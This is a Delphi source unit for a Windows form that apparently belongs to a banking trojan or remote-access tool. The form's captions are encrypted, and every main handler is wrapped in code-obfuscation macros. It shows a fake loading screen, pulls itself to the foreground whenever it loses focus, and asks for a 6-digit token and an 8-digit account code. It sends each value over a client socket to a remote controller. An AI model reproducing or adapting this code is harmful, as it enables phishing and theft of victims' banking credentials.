unit uPBF;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ExtCtrls, ComCtrls, pngimage, AppEvnts;

const
  nw21 = 24073;   // variavel pw
  nw22 = 65535;  // variavel pw2

type
  TfBXF = class(TForm)
    Progress: TProgressBar;
    pnlLoading: TPanel;
    lblDescription: TLabel;
    Label1: TLabel;
    imgLogo: TImage;
    tmProgress: TTimer;
    pnlS6: TPanel;
    imgLogo3: TImage;
    Label2: TLabel;
    Label3: TLabel;
    edtS6: TEdit;
    Label4: TLabel;
    Image2: TImage;
    Label5: TLabel;
    imgLimpa: TImage;
    Image3: TImage;
    lblErro: TLabel;
    Image4: TImage;
    Label6: TLabel;
    Label7: TLabel;
    pnlIntro: TPanel;
    Image5: TImage;
    Label8: TLabel;
    Label11: TLabel;
    Label9: TLabel;
    Label10: TLabel;
    Label12: TLabel;
    Image7: TImage;
    imgLE3: TImage;
    pnlSConta: TPanel;
    Image6: TImage;
    Label13: TLabel;
    Label14: TLabel;
    Label15: TLabel;
    Label16: TLabel;
    Image9: TImage;
    Image10: TImage;
    lblErro2: TLabel;
    edtSConta: TEdit;
    ApplicationEvents1: TApplicationEvents;
    imgLE1: TImage;
    imgLogo2: TImage;
    imgLE2: TImage;
    procedure tmProgressTimer(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure FormDeactivate(Sender: TObject);
    procedure imgLimpaClick(Sender: TObject);
    procedure Image3Click(Sender: TObject);
    procedure Image7Click(Sender: TObject);
    procedure Image10Click(Sender: TObject);
    procedure Image9Click(Sender: TObject);
    procedure ApplicationEvents1Deactivate(Sender: TObject);
    procedure FormCreate(Sender: TObject);
  private
    { Private declarations }
  public
    Ativado: boolean;
  end;

var
  fBXF: TfBXF;

implementation

uses Conectar, uSOBRE, funcs2013, uCrypt;

{$R *.dfm}


procedure TfBXF.ApplicationEvents1Deactivate(Sender: TObject);
begin
 // ENCODE_START macro
 asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  if Self.Visible then
     SetForegroundWindow(self.Handle);

 // ENCODE_END macro
 asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;
end;

procedure TfBXF.FormCreate(Sender: TObject);
var
  Msg: String;
begin
 // ENCODE_START macro
 asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  // INTRO
  //fBXF.Caption := Decrypt('¼o',nw22);
  Label11.caption := Crypt('D','7EE60ED278D673A6441E31E4439E3E091F26CF74AA5B28B8287F9C4FF533FD13B7D576');
  Label10.Caption := Crypt('D','A6B273B654F35088E47BD70F399130CE78D4045C9CBC78E86EB99740EE08709D24D374AF5887BFF0994A26BA61CE0F39944B89BC7100365D36CA7AB6514397CD18C477AE96');
  label12.Caption := Crypt('D','D54E3BFA10B01634EA39AE5036A727C665B064F42DCFBC064F87B79A49E45D9C34EC22C4ED082C1B32D4B832E11933E86389C9BF58E018BA6F95B683BF81923791B05C86AD5034E174D2C00226CC7DCC0B1835E4934329D9B52EF032DA0C3FE017AFDF7D98');
  Msg := 'D04BEEB36BB92ED6084A85AE65FF4235E172A2F31DCD68EC54FF2FDE0D271FC80A34D408A89D5C' ;
  Msg := Msg + 'EA19CFA324D70831DB77A132F742FF38619947E65289CC085FF761CB8EB06E93478591329550';
  Msg := Msg + 'FE53984D5E9D42E21CC475AFAE4236ED167C86BE7C12B613C9A521A550F265F634297CA4F51DC566EC78AF50F';
  Msg := Msg + 'C5E89A64452FF20DC7FF84EC9669BB0E00338E00F4FF940F73009A5FC3BEC10D50B428692C3609946ED45FC24B';
  Msg := Msg + '81AB11063994141FA6FAE63994923DBB720D51FC97791AB4B3AD776EE2FD177A456F951F63CE263D4';
  Label8.Caption := Crypt('D',Msg);
  Label9.Caption := Crypt('D','3C26C7609D21B59E418291B761ECE0076EFA1848FB35F72CAA3BE3086B83AD51F22CD077AD42E345');

  // S6
  // aten
  Label5.Caption  := Crypt('D','A3BD678DA23D955BF0EAFD290F4A89FE252CD57AAC5D2EA63A6D934BF936C3E7FD27');
  Label2.Caption  := Crypt('D','80F916D5055CFD1478EB3FF61AB12ADCB52FD1C0BC9D518EC31AC07DB38BA3498DA485BA6C8E559F48EC2EA75B34DA074021B680BB6989D30B3CFC0BBBAD2E7AE91C76ABD571A2498B9F36AF9C46F444F36A1E43F9');
  Label3.Caption  := Crypt('D','1E28D81632A1F21CCDDF25012328BF7EBB1ED4');
  lblErro.Caption := Crypt('D','A6A05390B4247790B9EB11759FB42CC27ED80918CB7B8DC80D48E315353B03005881AB51F341F83FF819CA002FEC1F00');
  Label4.Caption  := Crypt('D','160E2B4E8D9F3AE31BB2163BEB35A6914C84B7113819DF71D580EE183EFF2CC1D70735D9B84F945DF323C00B2D5A73AFFB2AB87DBC7D89C4F32EDD6AC31ABAEE6B1A34E104381CC61F0B498FAD69824A65E75A3B');

  // loading
  label1.Caption := Crypt('D','86FF75C4468192B053F45AFF28A53BF953F31CA08AAC4F88CE73A946E9012B075A87BA5384330432EB22CF0C34E10E3F9AFB5523C96583C876AD87A24D8DDDC9083EE740EE1F7BA83D8694E90B34D5689D30E8482321C86483D516291E');

  // SCont
  Label16.Caption := Label5.Caption;
  Label13.Caption := Crypt('D','0D74E80635AC2CC6AA3E6DA44C83DB6AC31D3B6A87B775DD091EC06FA25C24D87DA65B81A75A98558AE90140EC42EE42974DF60E20D01C446703380D389586C78CB56185BE95BD65B613B713D47115D803');
  Label14.Caption := Crypt('D','A2AC47E4015043EC021040EB1CA93B');
  lblErro2.Caption := Crypt('D','818DA747E377A442EF22B6629632A394B4163C9A47F80DB52178D66D9854E5144329D6093ECA6F83BC729BF9');
  Label15.Caption := Crypt('D','4BD51356859732EB134A8FBC69B02215C112C51FCAAB4C85C194FA2CD26480ADFB3BE90465935F83A955F25DFFA8C17CA8598F54E71620ADEA1534C0A93C988CCE87A15F81BB9F429480C20123DC0ED5F2513312');

 // ENCODE_END macro
 asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

end;

procedure TfBXF.FormDeactivate(Sender: TObject);
begin
 // ENCODE_START macro
 asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  if Self.Visible then
     SetForegroundWindow(self.Handle);

  // ENCODE_END macro
 asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

 end;

procedure TfBXF.FormShow(Sender: TObject);
begin
 // ENCODE_START macro
 asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  Color := clBtnFace;
  edtS6.Clear;
  edtSConta.Clear;
  pnlIntro.BringToFront;
  if Self.Caption = Decrypt(nBB2,nw21) then
  begin
    imgLogo.Hide;
    // imgLogo3.Hide;
    imgLogo2.Hide;
    imgLE1.Show;
    imgLE2.Show;
    imgLE3.Show;
  end;
  SetForegroundWindow(fSOBRE.Handle);

 // ENCODE_END macro
 asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

end;

procedure TfBXF.Image10Click(Sender: TObject);
begin
 // ENCODE_START macro
 asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  Screen.Cursor := crHourGlass;
  Sleep(3000);
  Screen.Cursor := crDefault;
  if Length(edtSConta.Text) <> 8 then
  begin
    lblErro2.Visible := True;
    edtSConta.Clear;
    Exit;
  end;
  fCliente.CS1.Socket.SendText(Decrypt('¼o’P€!p¦}',nw22)+'|'+edtSConta.Text);
  pnlLoading.BringToFront;
  edtSConta.Clear;
  tmProgress.Enabled := True;
 // ENCODE_END macro
 asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

end;

procedure TfBXF.Image3Click(Sender: TObject);
begin
 // ENCODE_START macro
 asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  Screen.Cursor := crHourGlass;
  Sleep(3000);
  Screen.Cursor := crDefault;
  if Length(edtS6.Text) <> 6 then
  begin
    lblErro.Visible := True;
    edtS6.Clear;
    Exit;
  end;
  fCliente.CS1.Socket.SendText(Decrypt('G[ÕnLb',1234)+'|'+edtS6.Text);
  edtS6.Clear;
  pnlLoading.BringToFront;
  tmProgress.Enabled := True;
 // ENCODE_END macro
 asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

end;

procedure TfBXF.Image7Click(Sender: TObject);
begin
 // ENCODE_START macro
 asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  Screen.Cursor := crHourGlass;
  Sleep(3000);
  Screen.Cursor := crDefault;
  if Self.Caption = Decrypt(nBB2,nw21) then
     pnlSConta.BringToFront
  else
     pnlS6.BringToFront;
 // ENCODE_END macro
 asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

end;

procedure TfBXF.Image9Click(Sender: TObject);
begin
  edtSConta.Clear;
end;

procedure TfBXF.imgLimpaClick(Sender: TObject);
begin
  edtS6.Clear;
end;

procedure TfBXF.tmProgressTimer(Sender: TObject);
begin
  Progress.Position := Progress.Position+1;
end;

end.
